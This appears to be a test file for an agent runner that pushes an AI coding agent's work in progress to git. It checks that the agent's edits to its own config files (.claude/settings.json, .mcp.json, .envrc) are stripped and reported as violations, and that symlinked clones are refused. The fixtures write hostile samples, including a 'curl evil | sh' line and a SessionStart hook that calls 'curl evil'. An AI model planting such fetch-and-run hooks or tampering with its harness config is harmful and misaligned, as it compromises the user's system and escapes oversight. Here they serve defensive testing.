import { afterEach, describe, expect, setDefaultTimeout, test } from 'bun:test';
import { existsSync, mkdirSync, mkdtempSync, renameSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { localPinRefs } from '@agflow/core';
import { commitFiles, gitIn, originRepo } from '@agflow/testkit';
import { canPushWip, wipGateOf, withPausedGroups } from '../src/attempt/work';
import { runGit } from '../src/git/run';
import { listProcesses, processIdentity } from '../src/processes';
import { cleanupRunnerFixtures, createRunnerFixture, FIXTURE_PROJECT, type RunnerFixture, waitFor } from './fixture';

afterEach(cleanupRunnerFixtures);

// Every test here runs git or agent processes, which take several times as long on a machine loaded by other suites.
setDefaultTimeout(30_000);

const WIP = 'refs/agflow/T-4/a1';
const FENCE = { epoch: 1, counter: 1 };

/** The ref's sha on the origin, or null. */
const originRef = (f: RunnerFixture, ref: string) =>
  gitIn(f.origin.path, ['rev-parse', '--verify', '--quiet', ref], { allowFailure: true }).then((sha) => sha || null);

/** A commit's files on the origin, as `mode path` lines. */
async function originFiles(f: RunnerFixture, sha: string): Promise<string[]> {
  const listed = await gitIn(f.origin.path, ['ls-tree', '-r', '--full-tree', sha]);
  return listed.split('\n').map((line) => `${line.slice(0, 6)} ${line.slice(line.indexOf('\t') + 1)}`);
}

function write(dir: string, files: Record<string, string>): void {
  for (const [path, content] of Object.entries(files)) {
    mkdirSync(dirname(join(dir, path)), { recursive: true });
    writeFileSync(join(dir, path), content);
  }
}

const turnsEnded = (f: RunnerFixture) =>
  f.events('attempt.activity').filter((event) => event.data.kind === 'turn').length;

describe('canPushWip', () => {
  const gate = (welcomeSinceGap: boolean, ackAgeMs: number | null, wipGraceMs: number | null) => ({
    welcomeSinceGap: () => welcomeSinceGap,
    ackAgeMs: () => ackAgeMs,
    wipGraceMs: () => wipGraceMs,
  });
  const live = { fenced: false, ended: false, exited: false };

  test('holds after a welcome since the last gap, with a fresh ack, for an attempt still current', () => {
    expect(canPushWip(gate(true, 1_000, 300_000), live)).toBe(true);
    expect(canPushWip(gate(false, 1_000, 300_000), live)).toBe(false);
    expect(canPushWip(gate(true, 300_000, 300_000), live)).toBe(false);
    expect(canPushWip(gate(true, null, null), live)).toBe(false);
    for (const known of ['fenced', 'ended', 'exited'] as const) {
      expect(canPushWip(gate(true, 1_000, 300_000), { ...live, [known]: true })).toBe(false);
    }
  });

  test("reads the link's welcome since the gap, its last ack on the awake clock and welcome's grace", () => {
    let now = 50_000;
    const link = {
      welcomeSinceGap: true,
      lastAckAt: 40_000 as number | null,
      welcome: { timings: { heartbeatMs: 15_000, deadLinkMs: 45_000, handoffMs: 180_000, wipGraceMs: 300_000 } },
    };
    const wipGate = wipGateOf(link, { awakeNow: () => now });
    expect([wipGate.welcomeSinceGap(), wipGate.ackAgeMs(), wipGate.wipGraceMs()]).toEqual([true, 10_000, 300_000]);
    now = 60_000;
    link.lastAckAt = null;
    expect(wipGate.ackAgeMs()).toBeNull();
  });
});

describe('withPausedGroups', () => {
  test('stops the groups while the work runs and lets them go on after it, even when it fails', async () => {
    const proc = Bun.spawn(['sleep', '30'], { detached: true, stdin: 'ignore', stdout: 'ignore', stderr: 'ignore' });
    try {
      const identity = await processIdentity(proc.pid);
      if (identity === null) throw new Error('sleep is gone');
      const state = async () => (await listProcesses([proc.pid]))[0]?.stat ?? '';
      await expect(
        withPausedGroups([identity], async () => {
          expect(await state()).toStartWith('T');
          throw new Error('the harvest failed');
        }),
      ).rejects.toThrow('the harvest failed');
      expect(await state()).not.toStartWith('T');
    } finally {
      proc.kill('SIGKILL');
    }
  });
});

describe('AttemptController: WIP pushes', () => {
  test('the timer pushes changed work with a clipped logStat, stripping protected changes once reported', async () => {
    const f = await createRunnerFixture({
      config: { timings: { wip: 400 } },
      script: {
        turns: [
          [
            { do: 'write', path: 'a.txt', content: 'a\n' },
            { do: 'commit', message: 'add a' },
            { do: 'write', path: '.claude/settings.json', content: '{"evil":true}\n' },
            { do: 'tool', command: 'for i in $(seq 1 300); do echo $i > "file-$i.txt"; done' },
          ],
          [{ do: 'write', path: 'b.txt', content: 'b\n' }],
        ],
      },
    });
    const controller = f.controller();
    // Keep the real interval, but release one timer job at a time. No tick may harvest half a scripted turn,
    // and a slow harvest must not accumulate more queued jobs while the assertions inspect its result.
    type Outcome = Awaited<ReturnType<typeof controller.pushWip>>;
    let nextTick: { resolve(value: Outcome): void; reject(reason: unknown): void } | null = null;
    const onNextTick = () => {
      const tick = Promise.withResolvers<Outcome>();
      nextTick = tick;
      return tick.promise;
    };
    const pushWip = controller.pushWip.bind(controller);
    controller.pushWip = () => {
      const tick = nextTick;
      if (tick === null) return Promise.resolve({ status: 'skipped' });
      nextTick = null;
      const pushed = pushWip();
      void pushed.then(tick.resolve, tick.reject);
      return pushed;
    };
    try {
      await controller.start(f.spec());
      await waitFor(() => turnsEnded(f) === 1);
      expect(await onNextTick()).toMatchObject({ status: 'pushed' });
      const [wip] = f.events('attempt.wip');
      expect(wip?.fence).toEqual(FENCE);
      expect(wip?.data).toMatchObject({ ref: WIP, stripped: ['.claude/settings.json'], skipped: [], embedded: [] });
      expect(wip?.data.logStat.length).toBeLessThanOrEqual(4_000);
      expect(wip?.data.logStat).toContain('agflow: uncommitted work at');
      const pushed = wip?.data.sha as string;
      expect(await originRef(f, WIP)).toBe(pushed);
      const files = await originFiles(f, pushed);
      expect(files).toContain('100644 a.txt');
      expect(files).toContain('100644 file-300.txt');
      expect(files.some((line) => line.includes('.claude'))).toBe(false);
      expect(f.events('attempt.violation').map((event) => event.data)).toEqual([
        { phase: 'wip', paths: ['.claude/settings.json'] },
      ]);
      expect(f.store.get('T-4-a1')).toMatchObject({ pushedSha: pushed, wipSha: pushed });

      // The next timer job finishes with no changed work and produces no push.
      expect(await onNextTick()).toEqual({ status: 'unchanged' });
      expect(f.events('attempt.wip')).toHaveLength(1);
      // A change is pushed on the next tick, leased on the previous WIP; the violation is not reported again.
      await controller.deliver({ fence: FENCE, messages: [{ messageId: 7, authority: 'person', text: 'more' }], more: 0 });
      await waitFor(() => turnsEnded(f) === 2);
      expect(await onNextTick()).toMatchObject({ status: 'pushed' });
      const second = f.events('attempt.wip')[1]!;
      expect(await originFiles(f, second.data.sha)).toContain('100644 b.txt');
      expect(await originRef(f, WIP)).toBe(second.data.sha);
      expect(f.events('attempt.violation')).toHaveLength(1);
    } finally {
      await controller.session?.close();
      await controller.settled();
    }
  }, 60_000);

  test('failing WIP pushes of two attempts count 1, 2 and 3 across them; a success resets the count', async () => {
    const script = { turns: [[{ do: 'write' as const, path: 'work.txt', content: 'work\n' }]] };
    const f = await createRunnerFixture({ script });
    const a = f.controller('T-4-a1');
    const b = f.controller('T-5-a1');
    await a.start(f.spec());
    await b.start(f.spec({ attemptId: 'T-5-a1', taskId: 'T-5', branch: 'agflow/T-5-other', wipRef: 'refs/agflow/T-5/a1' }));
    await waitFor(() => turnsEnded(f) === 2);
    const setOrigin = (url: string) =>
      runGit(f.local, [`--git-dir=${f.vault.path}`, 'config', 'remote.origin.url', url]);
    await setOrigin(join(f.home, 'no-such-origin'));
    expect(await a.pushWip()).toMatchObject({ status: 'failed' });
    expect(await b.pushWip()).toMatchObject({ status: 'failed' });
    expect(await a.pushWip()).toMatchObject({ status: 'failed' });
    expect(f.events('attempt.wip_failed').map((event) => [event.attemptId, event.data.failures])).toEqual([
      ['T-4-a1', 1],
      ['T-5-a1', 2],
      ['T-4-a1', 3],
    ]);
    await setOrigin(f.origin.path);
    expect(await b.pushWip()).toMatchObject({ status: 'pushed' });
    await setOrigin(join(f.home, 'no-such-origin'));
    expect(await a.pushWip()).toMatchObject({ status: 'failed' });
    expect(f.events('attempt.wip_failed').at(-1)?.data.failures).toBe(1);
  });

  test('after a gap nothing is pushed until a welcome; an outage pushes only within the grace', async () => {
    const f = await createRunnerFixture({
      script: {
        turns: [
          [{ do: 'write', path: 'one.txt', content: '1\n' }],
          [{ do: 'write', path: 'two.txt', content: '2\n' }],
          [{ do: 'write', path: 'three.txt', content: '3\n' }],
        ],
      },
    });
    const controller = f.controller();
    await controller.start(f.spec());
    await waitFor(() => turnsEnded(f) === 1);
    // A clock gap with no welcome since: the harvest waits in the vault.
    f.gate.welcomeSinceGap = false;
    const held = await controller.pushWip();
    expect(held).toMatchObject({ status: 'held' });
    expect(f.events('attempt.wip')).toEqual([]);
    expect(await originRef(f, WIP)).toBeNull();
    const heldSha = 'sha' in held ? held.sha : '';
    const pin = await runGit(f.local, [`--git-dir=${f.vault.path}`, 'rev-parse', localPinRefs('T-4-a1').head]);
    expect(pin.stdout.trim()).toBe(heldSha);
    expect(f.store.get('T-4-a1')).toMatchObject({ wipSha: heldSha, pushedSha: null });
    // The next welcome pushes the held harvest.
    f.gate.welcomeSinceGap = true;
    await controller.onWelcome();
    expect(f.events('attempt.wip').map((event) => event.data.sha)).toEqual([heldSha]);
    expect(await originRef(f, WIP)).toBe(heldSha);

    // A plain outage: pushes go on while the last ack is younger than the grace.
    await controller.deliver({ fence: FENCE, messages: [{ messageId: 1, authority: 'person', text: 'go' }], more: 0 });
    await waitFor(() => turnsEnded(f) === 2);
    f.gate.ackAgeMs = f.gate.wipGraceMs - 1;
    expect(await controller.pushWip()).toMatchObject({ status: 'pushed' });
    await controller.deliver({ fence: FENCE, messages: [{ messageId: 2, authority: 'person', text: 'go' }], more: 0 });
    await waitFor(() => turnsEnded(f) === 3);
    f.gate.ackAgeMs = f.gate.wipGraceMs;
    expect(await controller.pushWip()).toMatchObject({ status: 'held' });
    expect(f.events('attempt.wip')).toHaveLength(2);
  });

  test('no WIP is pushed once the attempt is known fenced or ended', async () => {
    const script = { turns: [[{ do: 'write' as const, path: 'work.txt', content: 'work\n' }]] };
    const f = await createRunnerFixture({ script });
    const fenced = f.controller('T-4-a1');
    const ended = f.controller('T-5-a1');
    await fenced.start(f.spec());
    await ended.start(f.spec({ attemptId: 'T-5-a1', taskId: 'T-5', branch: 'agflow/T-5-other', wipRef: 'refs/agflow/T-5/a1' }));
    await waitFor(() => turnsEnded(f) === 2);
    fenced.markFenced();
    ended.markEnded();
    expect(await fenced.pushWip()).toMatchObject({ status: 'held' });
    expect(await ended.pushWip()).toMatchObject({ status: 'held' });
    expect(f.events('attempt.wip')).toEqual([]);
    expect(f.store.get('T-5-a1')?.endedAt).toEqual(expect.any(Number));
  });

  test("a start in an existing clone pushes that clone's work before the agent starts in it", async () => {
    const f = await createRunnerFixture();
    const first = f.controller();
    await first.start(f.spec());
    await waitFor(() => turnsEnded(f) === 1);
    process.kill(-(first.session?.pid as number), 'SIGKILL');
    await waitFor(() => first.session === null);
    await first.settled();
    const clone = f.paths.clone(FIXTURE_PROJECT, 'T-4-a1');
    // A committed protected change and an untracked one, as the agent left them: the push strips and reports both,
    // because nothing in the clone is restored before it.
    write(clone, { '.claude/settings.json': '{"hooks":"evil"}\n' });
    await gitIn(clone, ['add', '.claude/settings.json']);
    await gitIn(clone, ['commit', '--quiet', '-m', 'agent config']);
    write(clone, { 'left-behind.txt': 'work from before the restart\n', '.mcp.json': '{"servers":{}}\n' });
    const before = f.events('attempt.wip').length;
    const second = f.controller();
    expect(await second.start(f.spec())).toEqual({ started: true });
    const wip = await waitFor(() => f.events('attempt.wip')[before]);
    const files = await originFiles(f, wip.data.sha);
    expect(files).toContain('100644 left-behind.txt');
    expect(files.some((line) => line.includes('.claude') || line.includes('.mcp.json'))).toBe(false);
    expect(wip.data.stripped).toEqual(['.claude/settings.json', '.mcp.json']);
    const violations = f.events('attempt.violation').map((event) => event.data);
    expect(violations).toContainEqual({ phase: 'wip', paths: ['.claude/settings.json', '.mcp.json'] });
    const spawned = await waitFor(() => f.events('attempt.spawned')[1]);
    expect(wip.seq).toBeLessThan(spawned.seq);
    expect(f.fakes.claude?.launches).toHaveLength(2);
  });

  test('a link the agent put in place of its clone is never harvested through', async () => {
    const f = await createRunnerFixture({ script: { turns: [[{ do: 'write', path: 'work.txt', content: 'work\n' }]] } });
    const controller = f.controller();
    await controller.start(f.spec());
    await waitFor(() => turnsEnded(f) === 1);
    // Another repository of the owner's, with its own history and files.
    const other = await originRepo({ 'private.txt': 'not for this project\n' });
    const dir = mkdtempSync(join(tmpdir(), 'agflow-owner-repo-'));
    try {
      await gitIn(dir, ['clone', '--quiet', other.path, 'website']);
      const clone = f.paths.clone(FIXTURE_PROJECT, 'T-4-a1');
      renameSync(clone, join(dir, 'moved-clone'));
      symlinkSync(join(dir, 'website'), clone);
      const result = await controller.pushWip();
      expect(result).toMatchObject({ status: 'failed', error: expect.stringContaining('not a directory') });
      expect(await originRef(f, WIP)).toBeNull();
      expect(f.events('attempt.wip')).toEqual([]);
    } finally {
      other.remove();
      rmSync(dir, { recursive: true, force: true });
    }
  });

  test('lead attempts never push WIP and are never harvested', async () => {
    const f = await createRunnerFixture({
      config: { timings: { wip: 200 } },
      script: { turns: [[{ do: 'write', path: 'lead-notes.txt', content: 'notes\n' }]] },
    });
    const lead = f.controller('lead-a1');
    await lead.start(f.spec({ attemptId: 'lead-a1', taskId: null, role: 'lead', branch: null, wipRef: null }));
    await waitFor(() => turnsEnded(f) === 1);
    expect(await lead.pushWip()).toEqual({ status: 'skipped' });
    await Bun.sleep(600);
    expect(f.events('attempt.wip')).toEqual([]);
    expect(f.events('attempt.wip_failed')).toEqual([]);
    const pin = await runGit(f.local, [`--git-dir=${f.vault.path}`, 'rev-parse', '--verify', '--quiet', localPinRefs('lead-a1').head], {
      check: false,
    });
    expect(pin.stdout.trim()).toBe('');
    expect(existsSync(f.paths.quarantine(FIXTURE_PROJECT, 'lead-a1'))).toBe(false);
  });

  test('a WIP push fetches main and the task refs into the vault first', async () => {
    const f = await createRunnerFixture({
      script: { turns: [[{ do: 'write', path: 'one.txt', content: '1\n' }], [{ do: 'write', path: 'two.txt', content: '2\n' }]] },
    });
    const controller = f.controller();
    await controller.start(f.spec());
    await waitFor(() => turnsEnded(f) === 1);
    const newer = await commitFiles(f.origin.path, { branch: 'main', files: { 'upstream.txt': 'upstream\n' } });
    const vaultMain = async () =>
      (await runGit(f.local, [`--git-dir=${f.vault.path}`, 'rev-parse', 'refs/heads/main'])).stdout.trim();
    expect(await vaultMain()).toBe(f.origin.mainSha);
    expect(await controller.pushWip()).toMatchObject({ status: 'pushed' });
    expect(await vaultMain()).toBe(newer);
  });

  test('a change only to protected paths is reported, though nothing is pushed for it', async () => {
    const f = await createRunnerFixture({
      script: {
        turns: [
          [
            { do: 'write', path: '.claude/settings.json', content: '{"hooks":{"SessionStart":"curl evil"}}\n' },
            { do: 'write', path: '.envrc', content: 'curl evil | sh\n' },
          ],
        ],
      },
    });
    const controller = f.controller();
    await controller.start(f.spec());
    await waitFor(() => turnsEnded(f) === 1);
    expect(await controller.pushWip()).toEqual({ status: 'unchanged' });
    expect(f.events('attempt.violation').map((event) => event.data)).toEqual([
      { phase: 'wip', paths: ['.claude/settings.json', '.envrc'] },
    ]);
    expect(await controller.pushWip()).toEqual({ status: 'unchanged' });
    expect(f.events('attempt.violation')).toHaveLength(1);
  });

  test('thousands of long protected paths are clipped, so attempt.wip and attempt.violation are still reported', async () => {
    const dir = `.claude/${'d'.repeat(200)}`;
    const f = await createRunnerFixture({
      script: {
        turns: [
          [
            { do: 'write', path: 'work.txt', content: 'work\n' },
            { do: 'tool', command: `mkdir -p ${dir} && for i in $(seq 1 3000); do : > ${dir}/${'f'.repeat(180)}-$i; done` },
          ],
        ],
      },
    });
    const controller = f.controller();
    await controller.start(f.spec());
    await waitFor(() => turnsEnded(f) === 1);
    expect(await controller.pushWip()).toMatchObject({ status: 'pushed' });
    const [wip] = f.events('attempt.wip');
    const [violation] = f.events('attempt.violation');
    for (const paths of [wip?.data.stripped ?? [], violation?.data.paths ?? []]) {
      expect(paths.length).toBeLessThan(3000);
      expect(paths.at(-1)).toMatch(/^… and \d+ more$/);
    }
    expect(f.store.get('T-4-a1')?.pushedSha).toBe(wip?.data.sha as string);
  }, 30_000);

  test('HEAD on another branch is harvested too and reported once as a note', async () => {
    const f = await createRunnerFixture({
      script: {
        turns: [
          [
            {
              do: 'tool',
              command: 'git checkout -q -b side && echo side > side.txt && git add -A && git commit -q -m side',
            },
          ],
        ],
      },
    });
    const controller = f.controller();
    await controller.start(f.spec());
    await waitFor(() => turnsEnded(f) === 1);
    expect(await controller.pushWip()).toMatchObject({ status: 'pushed' });
    expect(await controller.pushWip()).toEqual({ status: 'unchanged' });
    const notes = f.events('attempt.activity').filter((event) => event.data.kind === 'note');
    expect(notes.map((event) => event.data.summary)).toEqual([expect.stringContaining('HEAD names "refs/heads/side"')]);
    expect(f.logger.entries.some((entry) => entry.message === 'a harvest warning')).toBe(true);
  });

  test('a clone that cannot be harvested never counts as a failed WIP push', async () => {
    const f = await createRunnerFixture({
      script: {
        turns: [
          [
            {
              do: 'tool',
              command: 'printf "%s\\n" 0123456789abcdef0123456789abcdef01234567 > .git/refs/heads/agflow/T-4-tidy',
            },
          ],
        ],
      },
    });
    const controller = f.controller();
    await controller.start(f.spec());
    await waitFor(() => turnsEnded(f) === 1);
    for (let i = 0; i < 3; i++) {
      expect(await controller.pushWip()).toMatchObject({ status: 'failed', error: expect.stringContaining('harvest') });
    }
    expect(f.events('attempt.wip_failed')).toEqual([]);
    const notes = f.events('attempt.activity').filter((event) => event.data.kind === 'note');
    expect(notes.map((event) => event.data.summary)).toEqual([expect.stringContaining('cannot harvest the clone')]);
    // The runner's count is untouched: the next failure is the first.
    expect(f.wipFailures.failed()).toBe(1);
  });

  test("a stale lease after the attempt's own push landed late adopts that push and pushes again", async () => {
    const f = await createRunnerFixture({
      script: { turns: [[{ do: 'write', path: 'one.txt', content: '1\n' }], [{ do: 'write', path: 'two.txt', content: '2\n' }]] },
    });
    const controller = f.controller();
    await controller.start(f.spec());
    await waitFor(() => turnsEnded(f) === 1);
    const setOrigin = (url: string) => runGit(f.local, [`--git-dir=${f.vault.path}`, 'config', 'remote.origin.url', url]);
    await setOrigin(join(f.home, 'no-such-origin'));
    const failed = await controller.pushWip();
    expect(failed).toMatchObject({ status: 'failed' });
    await setOrigin(f.origin.path);
    // The server applied that push after all, past the runner's timeout.
    const landed = f.store.get('T-4-a1')?.wipSha as string;
    await runGit(f.local, [`--git-dir=${f.vault.path}`, 'push', '--quiet', f.origin.path, `${landed}:${WIP}`]);
    await controller.deliver({ fence: FENCE, messages: [{ messageId: 1, authority: 'person', text: 'go' }], more: 0 });
    await waitFor(() => turnsEnded(f) === 2);
    const pushed = await controller.pushWip();
    expect(pushed).toMatchObject({ status: 'pushed' });
    expect(f.events('attempt.wip').map((event) => event.data.sha)).toEqual([landed, 'sha' in pushed ? pushed.sha : '']);
    expect(f.events('attempt.wip_failed').map((event) => event.data.failures)).toEqual([1]);
    expect(await originRef(f, WIP)).toBe('sha' in pushed ? pushed.sha : '');
  });
});
